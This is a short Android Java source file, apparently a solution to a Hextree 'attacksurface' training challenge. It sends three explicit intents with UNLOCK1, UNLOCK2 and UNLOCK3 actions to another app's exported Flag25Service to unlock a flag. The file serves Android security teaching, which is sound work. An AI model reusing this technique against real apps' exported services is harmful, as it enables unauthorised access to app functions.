package niraj.patali.startinservices;

import android.content.Intent;
import android.os.Bundle;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);

        // Starting service
        Intent intent1 = new Intent("io.hextree.services.UNLOCK1");
        intent1.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag25Service");
        startService(intent1);
        //again sending data to same service
        Intent intent2 = new Intent("io.hextree.services.UNLOCK2");
        intent2.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag25Service");
        startService(intent2);
        //again and again sending data to same service

        Intent intent3 = new Intent("io.hextree.services.UNLOCK3");
        intent3.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag25Service");
        startService(intent3);
    }
}
